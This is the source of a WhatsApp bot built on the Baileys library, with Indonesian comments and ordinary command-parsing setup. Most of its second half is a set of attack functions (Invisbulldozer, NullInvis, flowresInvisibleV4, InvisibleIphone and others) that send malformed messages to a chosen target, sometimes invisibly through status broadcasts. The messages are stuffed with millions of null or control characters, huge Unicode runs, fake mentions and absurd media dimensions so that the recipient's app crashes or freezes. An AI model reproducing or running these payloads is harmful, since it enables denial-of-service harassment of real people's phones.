//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('../Control/Ctrl')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header,
jidDecode,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('../System/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const FormData = require('form-data');
const fs = require('fs');
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Kai = async (Kai, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('../System/Data1')
 
//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Kai.decodeJid(Kai.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Kai.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/8mc9p2.png"
const Xxx = "https://files.catbox.moe/8mc9p2.png"
const Jepeg = fs.readFileSync('./xatanical.jpg')
const pepec = require('../System/pepec')
const Ryclol = fs.readFileSync('./invictus.jpeg')
const KaiziForAima = fs.readFileSync('./xatanical.jpg')
const KaiziTamvan = fs.readFileSync('./xata.png')
//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('../System/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../System/Data2')

//DATA ADDBOT / JADIBOT PAIRING

const {
	jadibot,
	stopbot,
	listbot
} = require('../Connection/jadibot')

//END
//SEETINGS STATUS BOT

if (!Kai.public) {
if (!CreatorOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//Kai.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//END
//FUNCTION  LOADING

async function loading () {
var Floading = [
"*𝚑𝚎𝚕𝚕𝚘*",
"*𝚠𝚎𝚕𝚌𝚘𝚖𝚎*",
"*𝚜𝚌𝚛𝚒𝚙𝚝*",
"*𝚟𝚎𝚛𝚜𝚒𝚘𝚗*",
"*𝚙𝚛𝚒𝚟𝚊𝚝𝚎*",
"*𝚃𝚛𝚎𝚍𝚒𝚌𝚝 𝙸𝚗𝚟𝚒𝚌𝚝𝚞𝚜*"
]
let { key } = await Kai.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await Kai.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//============= [ FAKEQUOTED ] ===============
async function Invisbulldozer(Kai, isTarget) {
  const zieeMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      productMessage: {
        product: {
          productImage: {
            url: "https://files.catbox.moe/f3t012.jpeg",
            mimetype: "image/jpeg",
            fileSha256: Buffer.from("T+i083KjdABcBnJBzbB8paMZoMyNxT3rc+8FUOb4Qtg=", "base64"),
            fileLength: "38617",
            height: 128000000,
            width: 7200000000,
            mediaKey: Buffer.from("zi+b43DCleFrEbpS7EOYN1eKcRykOKDmUmDj3ISXvZI=", "base64"),
            fileEncSha256: Buffer.from("54hPlvNm6Nk1roPnpQGvfvCu8JYb4wLalZ0FZay7Src=", "base64"),
            directPath: "/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1765450399",
            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD", "base64")
          },
          productId: "253813391248495300",
          title: "XyraāCantikkk 永遠に生きる" + "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000),
          currencyCode: "USD",
          priceAmount1000: "0",
          productImageCount: 1000000
        },
        businessOwnerJid: "225752674992330@lid"
      },
      messageContextInfo: {
        deviceListMetadata: {
          recipientKeyHash: "iGDumWoqJtlqxw==",
          recipientTimestamp: "1765411475"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "WP/LUg2LGEOMfWhJuSzNtPrDi+L1RjGRiYo+45drhMc="
      }
    },
    {}
  );

  await Kai.relayMessage("status@broadcast", zieeMsg.message, {
    messageId: zieeMsg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function NullInvis(isTarget, xrl = true) {

    let msg = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            remoteJid: " X ",
                            StatusAttributionType: "FORWARDED_FROM_STATUS",
                            StatusAudienceMetadata: "CLOSE_FRIENDS",
                            StatusSourceType: "TEXT",
                            mentions: Array.from({ length: 150 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"
                            ),
                            isForwarded: true,
                            fromMe: false,
                            forwardingScore: 9999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120363422445860082@newsletter",
                                serverMessageId: 1,
                                newsletterName: "X"
                            }
                        },
                        body: {
                            text: "X",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(1_000_000),
                            version: 3
                        }
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
        }
    );

    let etc = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            remoteJid: " X ",
                            StatusAttributionType: "FORWARDED_FROM_STATUS",
                            StatusAudienceMetadata: "CLOSE_FRIENDS",
                            StatusSourceType: "TEXT",
                            mentions: Array.from({ length: 150 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"
                            ),
                            isForwarded: true,
                            fromMe: false,
                            forwardingScore: 9999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120363422445860082@newsletter",
                                serverMessageId: 1,
                                newsletterName: "X"
                            }
                        },
                        body: {
                            text: "X",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"X","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1_000_000)}"}}`,
                            version: 3
                        }
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
        }
    );

    let fvckx = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            remoteJid: " X ",
                            StatusAttributionType: "FORWARDED_FROM_STATUS",
                            StatusAudienceMetadata: "CLOSE_FRIENDS",
                            StatusSourceType: "TEXT",
                            mentions: Array.from({ length: 150 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"
                            ),
                            isForwarded: true,
                            fromMe: false,
                            forwardingScore: 9999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120363422445860082@newsletter",
                                serverMessageId: 1,
                                newsletterName: "X"
                            }
                        },
                        body: {
                            text: "X",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_message",
                            paramsJson: "\x10".repeat(1_000_000),
                            version: 2
                        }
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
        }
    );

    await Kai.relayMessage(
        isTarget,
        { groupStatusMessageV2: { message: msg.message } },
        xrl ? { messageId: msg.key.id, participant: { jid: isTarget } } : { messageId: msg.key.id }
    );

    await Kai.relayMessage(
        isTarget,
        { groupStatusMessageV2: { message: etc.message } },
        xrl ? { messageId: etc.key.id, participant: { jid: isTarget } } : { messageId: etc.key.id }
    );

    await Kai.relayMessage(
        isTarget,
        { groupStatusMessageV2: { message: fvckx.message } },
        xrl ? { messageId: fvckx.key.id, participant: { jid: isTarget } } : { messageId: fvckx.key.id }
    );
}

async function MentionedJid(Kai, isTarget) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: Kai.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  copy_code: "𑜦𑜠".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "PAYMENT_PROMOTION",
                  flow_message_version: "3"
                })
              }
            ],
          },
        },
      },
    },
  };
  await Kai.relayMessage(isTarget, MentionedJidMsg, {
    messageId: Kai.generateMessageTag(),
    participant: { jid: isTarget }
  });
  await Kai.relayMessage(
    "status@broadcast",
    MentionedJidMsg,
    {
      messageId: Kai.generateMessageTag(),
      statusJidList: [isTarget],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: isTarget } }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function BlankMention(Kai, isTarget) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: Kai.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "PAYMENT_PROMOTION",
                    flow_message_version: "3"
                 })
               }
            ],
          },
        },
      },
    },
  };

  await Kai.relayMessage(isTarget, MentionedJidMsg, {
    messageId: Kai.generateMessageTag(),
    participant: { jid: isTarget }
  });
} 

async function flowresInvisibleV4(isTarget, xrl = true) {
    let msg = generateWAMessageFromContent(  
        isTarget,  
        {  
            viewOnceMessage: {  
                message: {  
                    interactiveResponseMessage: {  
                        contextInfo: {  
                            remoteJid: " X ",  
                            StatusAttributionType: "FORWARDED_FROM_STATUS",  
                            StatusAudienceMetadata: "CLOSE_FRIENDS",  
                            StatusSourceType: "TEXT",  
                            mentions: Array.from(  
                                { length: 1900 },  
                                () =>  
                                    "1" +  
                                    Math.floor(Math.random() * 5000000) +  
                                    "@.s.whatsapp.net"  
                            ),  
                            isForwarded: true,  
                            fromMe: false,  
                            forwardingScore: 9999,  
                            forwardedNewsletterMessageInfo: {  
                                newsletterJid: "120363422445860082@newsletter",  
                                serverMessageId: 1,  
                                newsletterName: "X"  
                            }  
                        },  
                        body: {  
                            text: "X",  
                            format: "DEFAULT"  
                        },  
                        nativeFlowResponseMessage: {  
                            name: "call_permission_request",  
                            paramsJson: "\u0000".repeat(1000000),  
                            version: 3  
                        }  
                    }  
                }  
            }  
        },  
        {  
            ephemeralExpiration: 0,  
            forwardingScore: 9741,  
            isForwarded: true,  
            font: Math.floor(Math.random() * 99999999),  
            background:  
                "#" +  
                Math.floor(Math.random() * 16777215)  
                    .toString(16)  
                    .padStart(6, "999999")  
        }  
    );  

    let etc = generateWAMessageFromContent(  
        isTarget,  
        {  
            viewOnceMessage: {  
                message: {  
                    interactiveResponseMessage: {  
                        contextInfo: {  
                            remoteJid: " X ",  
                            StatusAttributionType: "FORWARDED_FROM_STATUS",  
                            StatusAudienceMetadata: "CLOSE_FRIENDS",  
                            StatusSourceType: "TEXT",  
                            mentions: Array.from(  
                                { length: 150 },  
                                () =>  
                                    "1" +  
                                    Math.floor(Math.random() * 5000000) +  
                                    "@.s.whatsapp.net"  
                            ),  
                            isForwarded: true,  
                            fromMe: false,  
                            forwardingScore: 9999,  
                            forwardedNewsletterMessageInfo: {  
                                newsletterJid: "120363422445860082@newsletter",  
                                serverMessageId: 1,  
                                newsletterName: "X"  
                            }  
                        },  
                        body: {  
                            text: "X",  
                            format: "DEFAULT"  
                        },  
                        nativeFlowResponseMessage: {  
                            name: "address_message",  
                            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(  
                                1000000  
                            )}\"}}`,  
                            version: 3  
                        }  
                    }  
                }  
            }  
        },  
        {  
            ephemeralExpiration: 0,  
            forwardingScore: 9741,  
            isForwarded: true,  
            font: Math.floor(Math.random() * 99999999),  
            background:  
                "#" +  
                Math.floor(Math.random() * 16777215)  
                    .toString(16)  
                    .padStart(6, "999999")  
        }  
    );  

    let fvckx = generateWAMessageFromContent(  
        isTarget,  
        {  
            viewOnceMessage: {  
                message: {  
                    interactiveResponseMessage: {  
                        contextInfo: {  
                            remoteJid: " X ",  
                            StatusAttributionType: "FORWARDED_FROM_STATUS",  
                            StatusAudienceMetadata: "CLOSE_FRIENDS",  
                            StatusSourceType: "TEXT",  
                            mentions: Array.from(  
                                { length: 150 },  
                                () =>  
                                    "1" +  
                                    Math.floor(Math.random() * 5000000) +  
                                    "@.s.whatsapp.net"  
                            ),  
                            isForwarded: true,  
                            fromMe: false,  
                            forwardingScore: 9999,  
                            forwardedNewsletterMessageInfo: {  
                                newsletterJid: "120363422445860082@newsletter",  
                                serverMessageId: 1,  
                                newsletterName: "X"  
                            }  
                        },  
                        body: {  
                            text: "X",  
                            format: "DEFAULT"  
                        },  
                        nativeFlowResponseMessage: {  
                            name: "call_permission_message",  
                            paramsJson: "\x10".repeat(1000000),  
                            version: 2  
                        }  
                    }  
                }  
            }  
        },  
        {  
            ephemeralExpiration: 0,  
            forwardingScore: 9741,  
            isForwarded: true,  
            font: Math.floor(Math.random() * 99999999),  
            background:  
                "#" +  
                Math.floor(Math.random() * 16777215)  
                    .toString(16)  
                    .padStart(6, "999999")  
        }  
    );  

    await Kai.relayMessage(  
        isTarget,  
        {  
            groupStatusMessageV2: {  
                message: msg.message  
            }  
        },  
        xrl  
            ? { messageId: msg.key.id, participant: { jid: isTarget } }  
            : { messageId: msg.key.id }  
    );  

    await Kai.relayMessage(  
        isTarget,  
        {  
            groupStatusMessageV2: {  
                message: etc.message  
            }  
        },  
        xrl  
            ? { messageId: etc.key.id, participant: { jid: isTarget } }  
            : { messageId: etc.key.id }  
    );  

    await Kai.relayMessage(  
        isTarget,  
        {  
            groupStatusMessageV2: {  
                message: fvckx.message  
            }  
        },  
        xrl  
            ? { messageId: fvckx.key.id, participant: { jid: isTarget } }  
            : { messageId: fvckx.key.id }  
    );  
}

async function InvisibleIphone(isTarget) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: isTarget } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 64,
        thumbnailWidth: 60,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        isTarget,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await Kai.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [isTarget],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}

